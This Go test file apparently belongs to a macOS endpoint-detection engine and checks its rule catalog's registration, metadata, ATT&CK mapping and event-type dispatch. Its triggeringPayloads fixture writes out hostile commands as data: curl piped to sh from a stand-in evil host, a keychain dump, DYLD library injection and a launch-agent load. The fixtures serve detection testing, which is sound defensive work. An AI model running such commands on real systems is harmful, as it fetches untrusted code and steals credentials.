package catalog

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"slices"
	"sort"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/fleetdm/edr/server/rules/api"
)

// spec:server-detection-rules-engine/registered-rule-catalog/the-engine-reports-its-rule-catalog
//
// TestAll_RegisterEveryShippedRule pins down the registration order + size of the registry, so a new rule cannot land without
// explicitly being added here. The slice this returns is the single source of truth used by the production server's main.go and the
// docs generator (tools/gen-rule-docs); a silent drift between the two would mean operators see a different surface than the ATT&CK
// coverage promises. The spec scenario "the engine reports its rule catalog" is satisfied by this test because it asserts the exact
// ID list the spec enumerates. Note the spec lists the 9 catalog rules (suspicious_exec, shell_from_office, ..., dns_c2_beacon); the
// registry also includes application_control_block which is operator-policy-driven, not part of the spec-named catalog set.
func TestAll_RegisterEveryShippedRule(t *testing.T) {
	t.Parallel()
	// Scoped to the rules this project authors. The vendored corpus is asserted by count and by name in the corpus test, and
	// re-listing sixty-six ids here would duplicate that while making this list unreadable as what it is, which is the set of
	// rules someone on this team decided to ship.
	got := make([]api.Rule, 0, 12)
	for _, r := range New(nil) {
		if authored(r) {
			got = append(got, r)
		}
	}
	wantIDs := []string{
		"suspicious_exec",
		"persistence_launchagent",
		"dyld_insert",
		"shell_from_office",
		"osascript_network_exec",
		"credential_keychain_dump",
		"privilege_launchd_plist_write",
		"sudoers_tamper",
		"application_control_block",
		"dns_c2_beacon",
		"sensor_tamper",
		"sensor_recovery_failed",
	}
	require.Len(t, got, len(wantIDs))
	for i, want := range wantIDs {
		assert.Equal(t, want, got[i].ID(), "rule at index %d", i)
	}
}

// spec:server-detection-rules-engine/platform-scoped-rule-evaluation/every-cataloged-rule-declares-at-least-one-valid-platform
//
// The api.Rule interface requires Platforms(), so a rule cannot ship without declaring its target platforms (ADR-0018). This guard
// asserts every registered rule returns a non-empty set and that every value is a recognized platform, so the engine's platform
// scoping always has a concrete, valid set to filter against. Every current rule targets darwin; a future Windows or Linux rule must
// still pass this check.
func TestAll_DeclareValidPlatforms(t *testing.T) {
	t.Parallel()
	for _, r := range New(nil) {
		platforms := r.Platforms()
		require.NotEmpty(t, platforms, "rule %s must declare at least one platform", r.ID())
		for _, p := range platforms {
			assert.Truef(t, api.IsValidPlatform(p), "rule %s declares invalid platform %q", r.ID(), p)
		}
	}
}

// TestAll_DocStructIsPopulated walks every shipped rule's Doc() and locks in the operator-facing invariants. Drives coverage of each
// rule's Doc() body from the rules package itself so SonarCloud's Go coverage profile attributes the lines correctly (cross-package
// coverage isn't aggregated under the project's current `-coverprofile` setup). Same checks as the gate in tools/gen-rule-docs,
// repeated here so a future tool can be deleted without losing the contract.
func TestAll_DocStructIsPopulated(t *testing.T) {
	t.Parallel()
	allowedSeverities := map[string]struct{}{
		api.SeverityLow:      {},
		api.SeverityMedium:   {},
		api.SeverityHigh:     {},
		api.SeverityCritical: {},
	}
	for _, r := range New(nil) {
		t.Run(r.ID(), func(t *testing.T) {
			t.Parallel()
			d := r.Doc()
			assert.NotEmpty(t, d.Title, "Title must be set for %s", r.ID())
			assert.NotEmpty(t, d.Summary, "Summary must be set for %s", r.ID())
			assert.NotEmpty(t, d.Description, "Description must be set for %s", r.ID())
			assert.Contains(t, allowedSeverities, d.Severity,
				"%s declares severity %q; expected one of the SeverityLow|Medium|High|Critical constants",
				r.ID(), d.Severity)
			assert.NotEmpty(t, d.EventTypes, "EventTypes must list at least one type for %s", r.ID())
		})
	}
}

// authored reports whether r is a rule this project wrote, as opposed to one vendored from an upstream corpus (issue #764).
//
// The guards below fall into two kinds and this is the line between them. An ENGINE CONTRACT is a property every rule must satisfy
// however it got here, because the engine acts on it: a valid platform set, declared event types, a mode the router can act on, a
// title the alert and the docs agree on. Those stay unscoped.
//
// A HOUSE STYLE rule is a standard for prose and metadata this project authors: a title with no parenthetical, a claimed ATT&CK
// technique. Applying those to vendored data leaves two bad options. Editing the vendored file breaks the byte-identical guarantee
// a re-sync depends on and that TestImportedCorpus_MatchesTheVendoredManifest enforces; carrying a per-rule exemption list means a
// list that grows with every import and that nobody prunes. Scoping the guard says the real thing instead, which is that upstream
// does not write to our style guide and was never going to.
//
// Where a vendored rule falls outside a house rule, the exception is pinned by name in its own test, so the gap is visible and a
// re-sync that changes it fails rather than passing quietly.
func authored(r api.Rule) bool {
	// Delegates to the classifier production uses (the exported pack skips these, the export endpoint serves their bytes) rather
	// than re-deriving it from the concrete type. A second definition would drift the moment an imported rule is wrapped or its
	// type changes, and it would drift silently, because both answers look plausible.
	_, vendored := VendoredSource(r.ID())
	return !vendored
}

// spec:server-detection-rules-engine/canonical-rule-naming/a-rule-names-itself-the-same-way-everywhere
//
// TestAll_CanonicalDisplayName is the structural guard against the three-names-for-one-detection drift issue #519 fixed. It pins the
// single-source-of-truth invariant for every shipped rule: Doc().Title (docs, /api/rules, UI) MUST equal DisplayName(), so the doc
// surface can never silently diverge from the canonical name again. It also enforces that the canonical name is a clean human-readable
// label, not the old "<name> (parenthetical implementation detail)" form whose detail belongs in Summary. The finding-title half of the
// invariant (Finding.Title == DisplayName) is enforced for fixture-replayed rules by server/detection/testkit Replay and by each
// rule's positive-detection test. The one rule it cannot hold for, application_control_block, is exempt because it is a
// NonDetectionProjection rather than by name: its findings carry the matched app-control rule's id and severity from the payload,
// so there is no rule-level title for them to equal. TestAll_NonDetectionClassification below pins that set, so the exemption can
// never be widened by adding a name to a list.
func TestAll_CanonicalDisplayName(t *testing.T) {
	t.Parallel()
	for _, r := range New(nil) {
		t.Run(r.ID(), func(t *testing.T) {
			t.Parallel()
			name := r.DisplayName()
			assert.NotEmpty(t, name, "DisplayName must be set for %s", r.ID())
			assert.Equal(t, name, r.Doc().Title,
				"%s: Doc().Title must equal DisplayName() so the docs and the alert name the rule one way", r.ID())
			if authored(r) {
				assert.NotContains(t, name, "(",
					"%s DisplayName %q carries a parenthetical; the implementation detail belongs in Summary, the title stays a clean name",
					r.ID(), name)
			}
			assert.Equal(t, strings.TrimSpace(name), name, "%s DisplayName must not carry leading/trailing whitespace", r.ID())
		})
	}
}

// TestAll_ThreadsExclusionResolver confirms that the four exclusion-aware rules actually thread the supplied resolver onto their
// Exclusions field. Without this, a refactor of New could silently drop the wiring and every fleet would suddenly see the alerts they
// thought they'd silenced. The other rules don't consult exclusions, so they have no Exclusions field to check.
func TestAll_ThreadsExclusionResolver(t *testing.T) {
	t.Parallel()
	res := &fakeExclusions{}
	byID := map[string]api.Rule{}
	for _, r := range New(res) {
		byID[r.ID()] = r
	}
	assert.Same(t, res, byID["suspicious_exec"].(*SuspiciousExec).Exclusions)
	assert.Same(t, res, byID["persistence_launchagent"].(*PersistenceLaunchAgent).Exclusions)
	assert.Same(t, res, byID["privilege_launchd_plist_write"].(*PrivilegeLaunchdPlistWrite).Exclusions)
	assert.Same(t, res, byID["sudoers_tamper"].(*SudoersTamper).Exclusions)
}

// Compile-time proof that the two non-detections satisfy the optional interface. A rule that stops implementing it silently
// rejoins the operator-facing catalog, which is a documentation and ATT&CK-coverage change rather than a build failure, so the
// assertion is worth stating rather than relying on the runtime test below alone.
var (
	_ api.NonDetection = (*ApplicationControlBlock)(nil)
	_ api.NonDetection = (*SensorRecoveryFailed)(nil)
)

// TestAll_NonDetectionClassification pins which registered rules are NOT detections, and why. It is the discoverable counterpart
// to the opt-in api.NonDetection interface: the declaration lives on each rule (next to the reasoning), and this test is the one
// place that shows the whole classification at a glance.
//
// It guards in both directions, which is the point. A new rule that forgets to declare itself is treated as a detection, which is
// the safe default and needs no test. The failures worth catching are the other two: a detection that accidentally opts out
// disappears from GET /api/rules, the ATT&CK coverage export and docs/detection-rules.md without any other signal; and a
// non-detection that loses its declaration silently reappears there, re-inflating the coverage figure read during procurement.
func TestAll_NonDetectionClassification(t *testing.T) {
	t.Parallel()

	wantNonDetections := map[string]api.NonDetectionKind{
		// The AUTH_EXEC walker already decided on the host; this renders that decision as an alert row.
		"application_control_block": api.NonDetectionProjection,
		// Reports our own automatic repair giving up. Both documented causes are faults in our software.
		"sensor_recovery_failed": api.NonDetectionHealth,
	}

	gotNonDetections := map[string]api.NonDetectionKind{}
	for _, r := range New(nil) {
		nd, ok := r.(api.NonDetection)
		if !ok {
			assert.True(t, api.IsDetection(r), "%s implements no NonDetection, so it must read as a detection", r.ID())
			continue
		}
		assert.False(t, api.IsDetection(r), "%s declares a non-detection kind, so it must not read as a detection", r.ID())
		gotNonDetections[r.ID()] = nd.NonDetectionKind()
	}

	assert.Equal(t, wantNonDetections, gotNonDetections,
		"the set of non-detections changed; every rule here is absent from /api/rules, /api/attack-coverage and docs/detection-rules.md")
}

// TestAll_DetectionsClaimTechniques asserts every DETECTION maps to at least one ATT&CK technique, which is what makes the
// coverage export meaningful. It is scoped to detections deliberately: application_control_block returns an empty set on purpose
// (a successful block is the absence of adversary activity, not an instance of it), and before the split that correct behaviour
// had to be special-cased out of any such check.
func TestAll_DetectionsClaimTechniques(t *testing.T) {
	t.Parallel()

	for _, r := range New(nil) {
		if !api.IsDetection(r) || !authored(r) {
			continue
		}
		assert.NotEmpty(t, r.Techniques(), "detection %s must map to at least one ATT&CK technique", r.ID())
	}
}

// TestAll_DetectionsNameTheirAlgorithm pins that every detection declares the evaluator that decides it (issue #757).
//
// A Go-implemented rule is only inspectable if its file says which procedure runs it; without that, the exported file documents
// what the rule is for and stays silent on what it actually does. The check is scoped to detections because a non-detection is
// not exported at all, and it asserts the name is one of the registered set rather than merely non-empty: a typo would otherwise
// ship as an algorithm nothing implements, which is exactly the failure that put a fabricated `interval_regularity_and_entropy`
// into an early draft of the format.
func TestAll_DetectionsSayWhatDecidesThem(t *testing.T) {
	t.Parallel()

	// A detection says what decides it in exactly one of two ways: a graph rule names the Go evaluator that runs it, and a
	// converted rule carries a Sigma detection block in its pack file instead (issue #761). Naming both would point a reader at
	// code that no longer decides anything; naming neither leaves an exported file that cannot say what the rule does.
	known := map[string]struct{}{
		"ancestor_walk_path_prefix": {},
		"descendant_within_window":  {},
		"dns_resolve_then_connect":  {},
		"absence_within_window":     {},
		"btm_item_signing_verdict":  {},
	}

	seen := map[string]struct{}{}
	converted := 0
	for _, r := range New(nil) {
		if !api.IsDetection(r) {
			continue
		}
		name := api.AlgorithmNameOf(r)
		// An imported rule is decided by the vendored Sigma file it was loaded from, which is a detection block like any other;
		// it simply does not live in the pack, because the pack is where the rules this project authors keep theirs. Extending
		// the check rather than exempting these keeps the invariant saying what it means: every detection says what decides it.
		_, hasDetection := detections()[r.ID()]
		hasDetection = hasDetection || !authored(r)

		if hasDetection {
			converted++
			assert.Emptyf(t, name, "detection %s carries a detection block AND names algorithm %q; only one can decide it",
				r.ID(), name)
			continue
		}
		require.NotEmptyf(t, name,
			"detection %s names no algorithm and carries no detection block, so its exported file cannot say what decides it",
			r.ID())
		assert.Containsf(t, known, name, "detection %s names algorithm %q, which is not in the registered set", r.ID(), name)
		seen[name] = struct{}{}
	}

	assert.Positive(t, converted, "at least one rule is converted; if this drops to zero the conversion was reverted silently")
	assert.Len(t, seen, len(known),
		"every registered algorithm name must be claimed by a rule; an unclaimed name is a leftover from a deleted or renamed rule")
}

// schemaEventTypes reads the wire schema's event_type enum, so this file cannot drift from the contract the agent actually emits.
func schemaEventTypes(t *testing.T) []string {
	t.Helper()
	raw, err := os.ReadFile(filepath.Join("..", "..", "..", "..", "schema", "events.json"))
	require.NoError(t, err, "read the event schema")

	var schema struct {
		Properties struct {
			EventType struct {
				Enum []string `json:"enum"`
			} `json:"event_type"`
		} `json:"properties"`
	}
	require.NoError(t, json.Unmarshal(raw, &schema))
	require.NotEmpty(t, schema.Properties.EventType.Enum, "the schema must enumerate event types")
	return schema.Properties.EventType.Enum
}

// spec:server-detection-rules-engine/a-rule-declares-the-event-types-it-consumes/a-rule-that-declares-no-event-types-is-refused
//
// TestAll_DeclareTheEventTypesTheyConsume pins that every registered rule names at least one real event type.
//
// The detection engine dispatches on this declaration (issue #762): a rule is invoked only for batches carrying a type it names.
// A rule declaring nothing still runs for every batch, because dispatch is an optimisation and the engine fails open rather than
// risk losing a detection, but relying on that would silently forfeit the optimisation for that rule. A declaration naming a type
// the agent never emits is the same mistake in the other direction: the rule would never be dispatched at all.
func TestAll_DeclareTheEventTypesTheyConsume(t *testing.T) {
	t.Parallel()

	known := schemaEventTypes(t)
	for _, r := range New(nil) {
		t.Run(r.ID(), func(t *testing.T) {
			t.Parallel()
			declared := r.Doc().EventTypes
			require.NotEmpty(t, declared, "rule %q declares no event types, so the engine cannot dispatch it", r.ID())
			for _, et := range declared {
				assert.Contains(t, known, et, "rule %q declares %q, which the agent never emits", r.ID(), et)
			}
		})
	}
}

// triggeringPayloads are deliberately incriminating payloads, each carrying a superset of the fields the catalog's rules decode,
// with values those rules WANT to see: a lookup, a remote address, a launch item, and a paired image path and argv.
//
// The field NAMES are the ones the rules' decoders actually read, taken from their payload structs and schema/events.json. An
// earlier version used `query` and `remote_addr`, which are not schema fields at all, so those decoders saw zero values and
// short-circuited: the payload was inert for the DNS and network rules while claiming to be incriminating.
//
// Path and argv vary TOGETHER, because a rule that turns on argument position also gates on the image that ran it: pinning the path
// to one rule's target makes every other rule's image test fail, and the payload stops being incriminating for anything but that
// one rule. That mistake made an earlier version of this test catch 1 of 5 deliberately mis-declared rules.
//
// The batch is replayed once per variant. Empty payloads would let an under-declared rule pass for the wrong reason: it would find
// nothing because the event was blank, rather than because it declined to read an event type it does not consume.
var triggeringPayloads = func() []string {
	variants := []struct{ path, argv string }{
		{"/etc/sudoers", `["sh","-c","curl http://evil.example.com|sh"]`},
		{"/usr/bin/security", `["security","dump-keychain","-d"]`},
		{"/bin/launchctl", `["launchctl","load","-w","/Users/x/Library/LaunchAgents/com.evil.plist"]`},
		{"/usr/bin/env", `["env","DYLD_INSERT_LIBRARIES=/tmp/evil.dylib","/bin/ls"]`},
		{"/usr/bin/osascript", `["osascript","-e","do shell script \"curl http://evil.example.com\""]`},
		{"/tmp/payload", `["/tmp/payload"]`},
	}
	out := make([]string, 0, len(variants))
	for _, v := range variants {
		out = append(out, `{"pid":100,"ppid":1,"path":"`+v.path+`","args":`+v.argv+
			`,"flags":1537,"query_name":"evil.example.com","response_addresses":["93.184.216.34"],`+
			`"direction":"outbound","remote_address":"93.184.216.34","remote_port":443,`+
			`"provider":"content_filter","state":"stopped","item_type":"agent",`+
			`"item_path":"/Users/x/Library/LaunchAgents/com.evil.plist","executable_path":"/tmp/evil"}`)
	}
	return out
}()

// resolvingGraph answers every process lookup with a real-looking row, for the same reason: a graph that resolves nothing would let
// an under-declared rule pass because its subject lookup came back empty rather than because it skipped the event.
type resolvingGraph struct{ *perPIDGraphReader }

func (resolvingGraph) GetProcessByPID(_ context.Context, _ string, pid int, _ int64) (*api.Process, error) {
	return &api.Process{ID: int64(pid), PID: pid, Path: "/usr/bin/tee"}, nil
}

// spec:server-detection-rules-engine/a-rule-declares-the-event-types-it-consumes/a-rule-finds-nothing-in-a-batch-of-types-it-does-not-declare
//
// TestAll_DeclaredEventTypesCoverWhatTheRuleReads is the safety property behind engine dispatch (issue #762).
//
// Dispatch skips a rule when the batch carries none of the types it declares. That is only sound if the rule could not have
// produced a finding from such a batch anyway. So: hand every rule a batch made ENTIRELY of the types it does not declare, and
// require it to find nothing. A rule that fires here is under-declared, and dispatching on its declaration would silently lose
// exactly those findings.
//
// This is the direction that matters. Over-declaring costs an invocation; under-declaring costs a detection, with no error, no log
// and no alert to notice.
//
// What it does and does not prove, measured rather than assumed. Deliberately mis-declaring each rule's event type, this catches 4
// of 7: sudoers_tamper, credential_keychain_dump, persistence_launchagent and dyld_insert. It misses three, each for a reason no
// single synthetic batch can fix:
//
//   - dns_c2_beacon needs a periodic BEACON across many events, not one lookup.
//   - osascript_network_exec needs a correlated ancestry in the process graph.
//   - privilege_launchd_plist_write needs a code-signing verdict on the launch item.
//
// Reproducing any of those means writing that rule's fixture, at which point the corpus gate in dispatch_equivalence_test.go covers
// it properly. So treat this as a tripwire for the common shape, not a proof.
//
// The complete evidence for the current catalog is not this test: it is that every rule's Evaluate gates on its declared type
// explicitly (an `evt.EventType != ...` guard on the first line), which was read rule by rule when dispatch was introduced.
func TestAll_DeclaredEventTypesCoverWhatTheRuleReads(t *testing.T) {
	t.Parallel()

	known := schemaEventTypes(t)
	for _, r := range New(nil) {
		t.Run(r.ID(), func(t *testing.T) {
			t.Parallel()
			declared := r.Doc().EventTypes

			for _, payload := range triggeringPayloads {
				var batch []api.Event
				for _, et := range known {
					if slices.Contains(declared, et) {
						continue
					}
					batch = append(batch, api.Event{
						EventID: "e-" + et, HostID: "h1", EventType: et, TimestampNs: 1, Payload: []byte(payload),
					})
				}
				require.NotEmpty(t, batch, "rule %q declares every event type, so this proves nothing", r.ID())

				// The error is deliberately ignored: the engine already logs and swallows a rule-evaluation error, so an error
				// on an event the rule does not consume changes nothing. A FINDING is what dispatch would lose, so that is
				// what is asserted.
				findings, _ := r.Evaluate(t.Context(), batch, resolvingGraph{&perPIDGraphReader{}})
				assert.Empty(t, findings,
					"rule %q produced a finding from a batch containing none of its declared types %v, so dispatching on "+
						"that declaration would drop the finding", r.ID(), declared)
			}
		})
	}
}

// TestAll_RulesDeclareAValidDefaultMode asserts every registered rule's default mode is one this engine can act on.
//
// api.DefaultModeOf deliberately reports what a rule declared rather than repairing it, so this is the gate: a rule declaring a
// mode the engine does not recognise would resolve to that value, fall past every case of the routing switch, and persist an alert.
// A monitor-mode rule silently promoted by a typo is the exact failure the declaration exists to prevent, and it would be invisible
// without this.
func TestAll_RulesDeclareAValidDefaultMode(t *testing.T) {
	t.Parallel()

	for _, r := range New(nil) {
		mode := api.DefaultModeOf(r)
		assert.True(t, api.IsValidDetectionRuleMode(mode), "rule %s declares default mode %q, which is not a mode", r.ID(), mode)
	}
}

// spec:server-detection-rules-engine/the-vendored-upstream-corpus-is-registered-and-does-not-alert-until-promoted/a-vendored-rule-outside-an-authoring-standard-is-recorded-by-name
//
// TestImported_RulesOutsideTheHouseStyleArePinned names every vendored rule that falls outside a guard the authored rules must
// satisfy, so scoping those guards costs visibility rather than buying silence.
//
// Each list is an exact set, not a lower bound. A re-sync that adds a rule claiming no technique, or one whose title carries a
// parenthetical, fails here and has to be looked at, which is the whole point: the guards were scoped because upstream does not
// write to our style guide, not because the gap stopped mattering.
func TestImported_RulesOutsideTheHouseStyleArePinned(t *testing.T) {
	t.Parallel()

	var noTechnique, parentheticalTitle []string
	for _, r := range New(nil) {
		if authored(r) {
			continue
		}
		if len(r.Techniques()) == 0 {
			noTechnique = append(noTechnique, r.ID())
		}
		if strings.Contains(r.DisplayName(), "(") {
			parentheticalTitle = append(parentheticalTitle, r.ID())
		}
	}
	sort.Strings(noTechnique)
	sort.Strings(parentheticalTitle)

	// Upstream tags these with a tactic only, or with nothing. A tactic is not a technique, and deriving one would put a mapping
	// nobody made into the ATT&CK coverage export, which is read during procurement. Claiming nothing is the honest answer: these
	// rules contribute no coverage rather than false coverage.
	assert.Equal(t, []string{
		"proc_creation_macos_hdiutil_create",
		"proc_creation_macos_jamf_susp_child",
		"proc_creation_macos_jamf_usage",
		"proc_creation_macos_susp_macos_firmware_activity",
		"proc_creation_macos_wizardupdate_malware_infection",
		"proc_creation_macos_xcsset_malware_infection",
	}, noTechnique, "the set of imported rules claiming no ATT&CK technique changed")

	assert.Equal(t, []string{
		"proc_creation_macos_csrutil_disable",
		"proc_creation_macos_csrutil_status",
	}, parentheticalTitle, "the set of imported rules whose title carries a parenthetical changed")
}
